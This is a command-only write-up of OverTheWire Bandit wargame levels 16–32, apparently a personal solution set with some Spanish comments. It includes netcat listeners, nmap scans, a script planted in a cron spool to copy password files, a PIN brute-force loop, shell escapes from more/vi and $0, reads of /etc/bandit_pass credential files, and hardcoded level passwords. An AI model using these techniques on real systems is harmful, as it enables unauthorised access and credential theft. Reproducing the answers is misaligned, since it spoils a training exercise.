# Bandit

The Bandit wargame is aimed at absolute beginners. It will teach the basics needed to be able to play other wargames. If you notice something essential is missing or have ideas for new levels, please let us know!

Link: `https://overthewire.org/wargames/bandit/bandit0.html`

#0-15

https://github.com/sashaNull/OverTheWire-Bandit-Writeup

#16
```
openssl s_client -connect localhost:30001
```
#17
```
nmap -sV localhost -p 31000-32000
openssl s_client -connect localhost:31790
```
#18
```
diff passwords.old passwords.new 
```
#19
```
./bandit20-do cat /etc/bandit_pass/bandit20
```
#20
```
echo "0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO" | nc -lnvp 44444 &
./suconnect 44444
```
#21
```
cat  /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
#22
```
cat /usr/bin/cronjob_bandit23.sh
cat /tmp/`echo I am user bandit23 | md5sum | cut -d ' ' -f 1`
```
#23
```
cat /usr/bin/cronjob_bandit24.sh
mkdir /tmp/tmp-123/; cd /tmp/tmp-123; touch pass; chmod 777 pass; echo -e "#\!/bin/sh\ncat /etc/bandit_pass/bandit24 > /tmp/tmp-123/pass" > /var/spool/bandit24/foo/test.sh; chmod 777 /var/spool/bandit24/foo/test.sh 
tail -f pass
```
#24
```
mkdir /tmp/tmp-1234; cd /tmp/tmp-1234; for i in {0..9999}; do printf "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 %04d\n" $i; done > pass.txt
cat pass.txt | nc 0 30002 > result.txt
sort result.txt | grep -v "Wrong!"
```
#25
```
# Ventana de la terminal pequeña para forzar el modo de comandos de `more`
v
:set shell=/bin/bash
:shell
cat /etc/bandit_pass/bandit26
```
#26
```
./bandit27-do cat /etc/bandit\_pass/bandit27
```
#27
```
# En local
git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
cat repo/README
```
#28
```
git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo; cd repo
git log
git checkout 8b7c651b37ce7a94633b7b7b7c980ded19a16e4f
cat README.md
```
#29
```
git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo; cd repo
git branch -a
git switch dev
cat README.md
```
#30
```
git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo; cd repo
git tag
git show secret
```
#31
```
git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo; cd repo
echo 'May I come in?' > key.txt
git add * -f
git commit -m "new"
git push origin master
```
#32
```
$0
cat /etc/bandit_pass/bandit33
```
